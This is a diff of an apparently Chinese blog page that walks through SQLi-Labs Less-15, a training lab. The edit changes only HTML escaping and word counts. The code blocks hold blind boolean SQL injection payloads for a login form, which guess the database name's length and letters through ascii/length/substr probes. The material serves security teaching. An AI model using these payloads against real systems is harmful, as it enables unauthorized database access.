@@ -423,7 +423,7 @@ admin&#39; and ascii(length((sel">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        274
+                        278
                     </div>
                     
 
@@ -453,10 +453,10 @@ admin&#39; and ascii(length((sel">
 <h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>55<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>55<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/O5cKM2WgI8pJZXj.png" alt="less15-1.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>56<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>56<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/d8LJQGYpgvuMVRn.png" alt="less15-2.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>56<span class="token comment" spellcheck="true">#</span>
@@ -468,10 +468,10 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <ul>
 <li>第一个字母</li>
 </ul>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>110<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>110<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/FSUwuC9bl7tJf2L.png" alt="less15-4.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/qM48LYVXJtDIvok.png" alt="less15-5.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115<span class="token comment" spellcheck="true">#</span>
@@ -762,7 +762,7 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">45.8k</span>&nbsp;字
+                class="white-color">46.5k</span>&nbsp;字
                
             
 			
